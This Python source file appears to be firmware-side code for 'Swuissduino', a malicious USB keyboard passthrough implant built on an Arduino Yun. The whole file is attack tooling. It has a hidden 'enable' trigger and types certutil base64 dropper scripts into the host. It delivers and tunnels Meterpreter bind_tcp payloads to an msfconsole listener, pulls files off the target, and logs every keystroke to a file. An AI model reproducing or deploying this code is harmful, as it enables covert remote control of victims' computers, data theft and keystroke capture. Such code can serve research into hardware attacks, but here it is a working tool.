#!/usr/bin/python

# Arduino Meets Linux:
# The User's Guide to Arduino Yun Development
# Copyright (c) 2015, Bob Hammell.

# Disclaimer:
# This code is provided by ArduinoMeetsLinux.com on an "AS IS"
# basis. ArduinoMeetsLinux.com makes no warranties, express or
# implied, regarding use of the code alone or in combination with
# your projects.
#
# In no event shall ArduinoMeetsLinux.com be liable for any special,
# indirect, incidental, or consequential damages (including, but not
# limited to, loss of data and damage to systems) arising in any way
# out of the use, reproduction, modification and/or distribution of
# this code.




import socket, struct, binascii, array, time, os, base64, errno, threading, hashlib, copy
import serial
from evdev import InputDevice,categorize,ecodes,InputEvent

enableCounter = 0
commandCounter = 0
menuLevel = -1
debugFlag = False
command = ""
menu = None
gOptimising = False
gMetConnected = False
EV_RAW    = 0x0200
EV_HID = 0x0300
RAW_EXIT = 0xFF
RAW_FILENAME = 0x10
RAW_DATA = 0x11
RAW_SIZE = 0x12
RAW_MET = 0x04
RAW_METCTL = 0x05
RAW_OPT = 0x06
RAW_MD5 = 0x07
RAW_OPT_CLI = 0x08
RAW_PKT = 0x09
RAW_PKT_GRP = 0x10
RAW_ACK_GRP = 0x11


iGroupSend = 0
iGroupRecv = 0
gBlockSend = False

scancodes = {
    # Scancode: ASCIICode
    0: None, 1: u'ESC', 2: u'1', 3: u'2', 4: u'3', 5: u'4', 6: u'5', 7: u'6', 8: u'7', 9: u'8', 10: u'9', 11: u'0', 12: u'-', 13: u'=', 14: u'BKSP',
    15: u'TAB', 16: u'q', 17: u'w', 18: u'e', 19: u'r', 20: u't', 21: u'y', 22: u'u', 23: u'i', 24: u'o', 25: u'p', 26: u'[', 27: u']', 28: u'CRLF',
    29: u'LCTRL', 30: u'a', 31: u's', 32: u'd', 33: u'f', 34: u'g', 35: u'h', 36: u'j', 37: u'k', 38: u'l', 39: u';', 40: u'\'', 41: u'#',
    42: u'LSHFT', 43: u'\\', 44: u'z', 45: u'x', 46: u'c', 47: u'v', 48: u'b', 49: u'n', 50: u'm', 51: u',', 52: u'.', 53: u'/', 54: u'RSHFT',
    56: u'LALT', 57: u' ', 86: u'\\', 100: u'RALT'
}

capscodes = {
    0: None, 1: u'ESC', 2: u'!', 3: u'\"', 4: u'$', 5: u'$', 6: u'%', 7: u'^', 8: u'&', 9: u'*', 10: u'(', 11: u')', 12: u'_', 13: u'+', 14: u'BKSP',
    15: u'TAB', 16: u'Q', 17: u'W', 18: u'E', 19: u'R', 20: u'T', 21: u'Y', 22: u'U', 23: u'I', 24: u'O', 25: u'P', 26: u'{', 27: u'}', 28: u'CRLF',
    29: u'LCTRL', 30: u'A', 31: u'S', 32: u'D', 33: u'F', 34: u'G', 35: u'H', 36: u'J', 37: u'K', 38: u'L', 39: u':', 40: u'@', 41: u'~',
    42: u'LSHFT', 43: u'|', 44: u'Z', 45: u'X', 46: u'C', 47: u'V', 48: u'B', 49: u'N', 50: u'M', 51: u'<', 52: u'>', 53: u'?', 54: u'RSHFT',
    56: u'LALT',  57: u' ', 86: u'|', 100: u'RALT'
}

configuration = {
    'osmode': 'windows',
    'arch': 'x86',
    'staged': 'staged',
    'encoder': 'base64certbatch',
    'keylog': False,
    'enabled': False,
    'blocksize': 64,
    'blockdef': '<B 63s',
    'metblock': '<B B 62s',
    'md5block': '<B 16s 47s'
}


# Encoder functions

def base64certbatch(params):
    '''Windows Batch - BASE64 decode via certutils '''

def encoder(script, client):
    '''Script encoder'''
    enc = script['encoder']
    out = ''
    # Open client file
    cl = open('/mnt/sda1/swissduino/'+client['client'],'r')
    enccl = enc(cl.read(),64) # Shouldn't have length here...
    # Do dodgy replacements for keys

    # Open script file
    with open(script['script'],'r') as sc:
        for line in sc:
            if script['placeholder'] in line:
                print "Found placeholder\n"
                out = out + enccl
            else:
                out = out + line
    return out

def base64encode(input, rowlength):
    output = base64.b64encode(input)
    if (rowlength==0):
        return output
    else:
        o = ""
        while output:
            o = o + output[:rowlength] + "\n"
            output = output[rowlength:]
        return o


def printmenu(level):
    if level == 0 or level == None:
        keyprint('''\n===================================
Swuissduino v0.1
===================================
''')
    elif level == -1:
        keyprint('\n===================================\n')
        keyprint('Disabled\n')
        keyprint('===================================\n')


def help(command):
    '''Help function'''
    keyprint('''h | help          Print help\n
c | config        Configuration
  os [windows|linux] [x86|x64]
  staged [true|false]
  encoder [base64certbatch|base64batch|base64bourneshell]
  show
g | generate      Generate script
t | transfer      Transfer mode
  filename
r | receive       Receive mode
m | meterpreter   Meterpreter mode
  send            Send meterpreter
  connect         Open meterpreter channel
e | exit          Exit
''')

def config(command):
    '''Config function'''
    #Do config
    cmd = command.split(' ')
    if len(cmd) < 2:
        keyprint('Error\n')
        return
    if cmd[1].lower() == 'show':
        config_line = ''
        for k,v in configuration.iteritems():
            config_line = '{0}:{1}\n'.format(k,v)
            keyprint(config_line)
        return
    if cmd[1].lower() == 'os':
        config_os(cmd[1:])
    if cmd[1].lower() == 'staged':
        if cmd[2].lower() == 'true':
            configuration['staged'] = 'staged'
        else:
            configuration['staged'] = 'stageless'


def config_os(cmd):
    '''Config OS command'''
    if len(cmd) < 3:
        keyprint('Error\n')
        return
    print'Config:%s %s' %(cmd[1],cmd[2])
    configuration['osmode']=cmd[1]
    configuration['arch']=cmd[2]
    configuration['blocksize']=64
    configuration['blockdef']='<B 63s'
    configuration['metblock']='<B B 62s'
    configuration['md5block']='<B B 16s 46s'

def meterpreter(command):
    '''Meterpreter function'''
    cmd = command.split(' ')
    print 'Command:%s' % cmd[1]
    if cmd[1].lower() == 'send':
        meterpreter_send(command)
        if configuration['staged']=='stageless':
            meterpreter_connect(command)
    if cmd[1].lower() == 'connect':
        meterpreter_connect(command)

def meterpreter_send(command):
    '''Meterpreter send function'''
    # Make use of transfer :)
    metfile = '/mnt/sda1/swissduino/meterpreter/'+configuration['osmode']+'/'+meterpreters[configuration['osmode']][configuration['arch']][configuration['staged']]
    print 'Metfile: %s' %metfile
    transfer('t '+metfile)
    # transfer('t /mnt/sda1/swissduino/meterpreter/windows/bind_tcp_9222')

def meterpreter_connect(command):
    '''Meterpreter connect function'''
    global s, gMetConnected,gSent,gReceived, client, tSend, tReceive

    # Enable HID raw transfer
    s.write(struct.pack("<HHI",EV_HID, 0x0000, 0x00))

    # Open local socket for listening for msfconsole
    m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    m.bind(("10.0.1.100", 9222))
    m.listen(1)

    m.setblocking(0)
    # s.setblocking(1)

    # http://stackoverflow.com/questions/16745409/what-does-pythons-socket-recv-return-for-non-blocking-sockets-if-no-data-is-r
    # blocking mode?
    print "Waiting for msfconsole connection..."
    connected = False
    while not connected:
        try:
            client, addr = m.accept()
            connected = True
        except socket.error, e:
            if e.args[0] == errno.EWOULDBLOCK:
                time.sleep(0.1)
    print "Connection received from %s" % str(addr)



    # Transfer loop
    gMetConnected = True
    tSend = threading.Thread(target=met_send,args=())
    tReceive = threading.Thread(target=met_recv,args=())
    tSend.daemon = True
    tReceive.daemon = True
    gSent = 0
    iSentOld = 0
    gReceived = 0
    iReceivedOld = 0
    tSend.start()
    tReceive.start()
    while gMetConnected:
        if (iSentOld<gSent or iReceivedOld<gReceived):
            print "Stats: %d %d" %(gSent,gReceived)
        iSentOld = gSent
        iReceivedOld = gReceived
        time.sleep(0.5)

    # Close out sockets
    m.close()

    bufs = struct.Struct(configuration['blockdef'])
    s.write(bufs.pack(RAW_EXIT,""))


def met_send():
    '''Blocking send thread'''
    global s,gMetConnected,gSent,gReceived, client
    print "Send thread!"
    # print "gOptimising: %r" % gOptimising
    # Config send to HID buffer
    # bufout = array.array('c','\0'*configuration['blocksize'])
    bufs = struct.Struct(configuration['metblock'])

    # Transfer loop
    while gMetConnected:
        # Receive from listen socket up to blocksize-2 bytes
        if (not gBlockSend):
            try:
                # TODO - is there an issue with blocking if not full bytes?
                # Verify that recv/read will send all or block!
                inb = client.recv(configuration['blocksize']-2)
            except socket.error, e:
                print "Receive from MSF error"
                print e
                if e.args[0] == errno.EWOULDBLOCK:
                      time.sleep(0.01)
                else:
                    gMetConnected = False
            inl = len(inb)
            # Send to atmega inl bytes in the inb buffer
            if inl!=0:
                try:
                    s.write(bufs.pack(RAW_METCTL,inl,inb))
                except Exception as e:
                    print "Send to HID error"
                    print e
                    if e.args[0] == serial.SerialTimeoutException:
                          time.sleep(0.01) # Flag a in block, and don't recv new?
                    else:
                        gMetConnected = False
                gSent += inl

    gMetConnected = False
    return

def met_recv():
    '''Blocking receive thread'''
    global s,gMetConnected,gSent,gReceived, gOptimising

    # Transfer loop
    while gMetConnected:
        # Receive from HID 1 packet
        try:
            # Check if this coincides with errors on other side
            buf = s.read(configuration['blocksize'])
        except Exception as e:
            print "Receive from HID error"
            print e
            if e.args[0] == serial.SerialTimeoutException:
                time.sleep(0.02)
            else:
                gMetConnected = False
        if len(buf) > 0:
            gBlockSend = True
            mode, outl, outb = struct.unpack_from(configuration['metblock'],buf)
            # Check if exit to receive exit when meterpreter exits
            if mode == RAW_EXIT:
                gMetConnected = False
                break
            # Chuck it onwards!
            elif mode == RAW_METCTL:
                try:
                    client.send(outb[:outl])
                except socket.error, e:
                    print "Send to MSF error"
                    print e
                    if e.args[0] == errno.EWOULDBLOCK:
                          time.sleep(0.02)
                    else:
                        gMetConnected = False
                gReceived += outl
        else:
            gBlockSend = False

    gMetConnected = False
    return

def generate(command):
    '''Generate function'''
    keyprint('Generate menu\nSnip below\n----8<----8<----8<----\n')
    # Show options based on current OS selection
    # but for now just do 1 :)
    keyprint(encoder(scripts[configuration['osmode']]['base64certbatch'],clients[configuration['osmode']][configuration['arch']]))

def transfer(command):
    '''Transfer function'''
    global s
    keyprint('\nTransfer menu\n')

    # Open file
    filename = command.split(' ')[1]
    print "Filename: %s" %filename
    try:
        f = open(filename, "rb")
    except IOError:
        print "Unable to open file %s" %filename
        keyprint("Unable to open file \'")
        keyprint(filename)
        keyprint("\'\n")
        return

    # Enable transfer mode
    # Send HID raw transfer signal in 5 bytes
    s.write(struct.pack("<HHI",EV_HID, 0x0000, 0x00))

    # Send filename (meterpreter receive will ignore this)
    print "Basename: %s" %(os.path.basename(filename))
    bufs = struct.Struct(configuration['blockdef'])
    s.write(bufs.pack(RAW_FILENAME,os.path.basename(filename).encode('utf-8')))

    filesize = os.stat(filename).st_size
    print "Filesize: %d" %filesize

    bufs = struct.Struct('<B L 59s')
    s.write(bufs.pack(RAW_SIZE,filesize,""))
    remaining = filesize
    try:
        bufs = struct.Struct(configuration['blockdef'])
        buffer = f.read(configuration['blocksize']-1)
        while buffer:
            #bufs.pack_into(buf,0,RAW_DATA,buffer)
            sent = s.write(bufs.pack(RAW_DATA,buffer))
            remaining = remaining - sent +1
            print "Remaining: %s" %remaining
            buffer = f.read(configuration['blocksize']-1)
    finally:
        f.close()
    bufs = struct.Struct(configuration['blockdef'])
    s.write(bufs.pack(RAW_EXIT,""))
    print("Transfer completed")

def receive(command):
    '''Receive function'''
    global s
    keyprint('\nWaiting to receive....\n')
    # Send HID raw transfer signal
    s.write(struct.pack("<HHI",EV_HID, 0x0000, 0x00))

    # Receive file name
    print 'Blocksize: %d\n' % configuration['blocksize']
    buf = s.read(configuration['blocksize'])
    mode, filename = struct.unpack_from(configuration['blockdef'],buf)
    filename = filename.rstrip('\0')
    if mode != RAW_FILENAME:
        print "Failed to get filename\n"
        return

    # Receive file length
    buf = s.read(configuration['blocksize'])
    mode, filesize = struct.unpack_from('<BL',buf)
    print "Mode:%d, Size:%d, Filename:%s" %(mode,filesize,filename)
    if mode != RAW_SIZE:
        print "Failed to get size\n"
        return

    # Open out file
    f = open (filename, 'wb')
    # Receive til no more
    bufs = struct.Struct(configuration['blockdef'])
    fPos = 0
    bReceiving = True
    while bReceiving:
        buf=s.recv(configuration['blocksize'])
        mode, filedata = struct.unpack_from(configuration['blockdef'],buf)
        if mode == RAW_OPT_CLI:
            optimise('')
            s.write(struct.pack("<HHI",EV_HID, 0x0000, 0x00))

        bPos = 0
        while bPos < (configuration['blocksize']-1) and fPos<filesize:
            f.write(filedata[bPos])
            fPos += 1
            bPos += 1
        if fPos == filesize:
            bReceiving = False
            print "Receive end: %d bytes" % fPos
        print "Received:%d bytes" % fPos
    f.close()
    bufs = struct.Struct(configuration['blockdef'])
    s.write(bufs.pack(RAW_EXIT,""))
    print "Receive complete"


def exitfunc(command):
    '''Exit menu, return to normality'''
    keyprint("Exiting... returning to normality\n")
    configuration['enabled'] = False

menus = {
    'H': help,
    'HELP': help,
    'C': config,
    'CONFIG': config,
    'G': generate,
    'GENERATE': generate,
    'T': transfer,
    'TRANSFER': transfer,
    'R': receive,
    'RECEIVE': receive,
    'M': meterpreter,
    'METERPRETER': meterpreter,
    'E': exitfunc,
    'EXIT': exitfunc
}

config_menus = {
    'OS': config_os
}

scripts = {
    'windows': {
        'base64certbatch': {
            'description': 'Windows Batch BASE64 Decoder with CertUtils',
            'function' : 'base64certbatch',
            'script' : 'scripts/windows/certdecode.bat',
            'encoder' : base64encode,
            'placeholder' : '@@BASE64ENCODE@@'
        },
        'base64batch': {
            'function' : 'base64batch',
            'script' : 'scripts/windows/batchdecode.bat',
            'encoder' : base64encode,
            'placeholder' : '@@BASE64ENCODE@@'
        }
    },
    'linux': {
        'base64bourneshell': {
            'description' : 'BASE64 client decoder with Bourne shell',
            'function' : 'base64shell',
            'script' : 'scripts/linux/base64bourneshell.sh',
            'encoder' : base64encode,
            'placeholder' : '@@BASE64ENCODE@@'
        }
    },
    'macosx': {

    }
}

clients = {
    'linux': {
        'x86': {
            'client': 'clients/linux/swiss-hid_x86'
        },
        'x64': {
            'client': 'clients/linux/swiss-hid_x64'
        }
    },
    'windows': {
        'x86': {
            'client': 'clients/windows/swiss-hid_win_x86.exe'
        },
        'x64': {
            'client': 'clients/windows/swiss-hid_win_x64.exe'
        }
    }
}

meterpreters = {
    'linux': {
        'x86': {
            'staged': '',
            'stageless': ''
        },
        'x64': {
            'staged': '',
            'stageless': ''
        }
    },
    'windows':{
        'x86': {
            'staged': 'x86_bind_tcp_9222',
            'stageless': 'x86_bind_tcp_9222_stageless'
        },
        'x64': {
            'staged': 'x64_bind_tcp_9222',
            'stageless': 'x64_bind_tcp_9222_stageless'
        }
    }
}


def keyprint(val):
    global debugFlag,s
    if debugFlag:
        print(val)
    else:
        for cha in val:
            s.write(struct.pack("<HHI", EV_RAW, ord(cha), 0x00))

def checkMenu(key):
    '''Check if enable password entered'''
    global enableCounter, menuLevel, commandCounter, command, menu
    enable = [u'e',u'n',u'a',u'b',u'l',u'e']
    disenable = [u'D',u'I',u'S',u'A',u'B',u'L',u'E']
    if configuration['enabled'] == False:
        if enable[enableCounter] == key:
            enableCounter += 1
            if enableCounter == len(enable):
                configuration['enabled'] = True
                menuLevel = 0
                printmenu(menuLevel)
                enableCounter = 0
        else:
            enableCounter = 0
    else:
        # [TODO] Do we have to reset enableCounter here? I'm not sure...
        enableCounter = 0
        # Get command
        if key == u'CRLF':
            # lookup command
            cmd = command.split(' ')
            print "Command:%s" % cmd[0]
            if cmd[0].upper() in menus:
                menu = menus[cmd[0].upper()]
                menu(command)
            else:
                keyprint('Unknown command\n\n')
            command = ""
        else:
            # If BKSP then delete last item, else add char
            if key == U'BKSP':
                command = command[:-1]
            else:
                command += key



if debugFlag:
    dev = InputDevice("/dev/input/event5")
    keylog = open('/home/drwesty/active/swissduino/swissduino.keylog','w')
else:
    dev = InputDevice("/dev/input/event1")
    keylog = open('/mnt/sda1/swissduino/swissduino.keylog','w')
    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect(("localhost", 6571))
    s = serial.Serial('/dev/ttyATH0', 9600)


caps = False
for event in dev.read_loop():
    if not debugFlag:
        sent = s.write(struct.pack("HHI", event.type, event.code, event.value))

    # Extract codes

    if event.type == ecodes.EV_KEY:
        data = categorize(event)
        if data.scancode == 42 or data.scancode == 54:
            if data.keystate == 1:
                caps = True
            if data.keystate == 0:
                caps = False
        if data.keystate == 1:
            if caps:
                key_lookup = u'{}'.format(capscodes.get(data.scancode)) or u'UNKNOWN:[{}]'.format(data.scancode)  # Lookup or return UNKNOWN:XX
            else:
                key_lookup = u'{}'.format(scancodes.get(data.scancode)) or u'UNKNOWN:[{}]'.format(data.scancode)  # Lookup or return UNKNOWN:XX
            if (data.scancode != 42) and (data.scancode != 54):
                checkMenu(key_lookup)
                if configuration.get('keylog') == True:
                    keylog.write(key_lookup+'\n')                                        # Write to keylog file
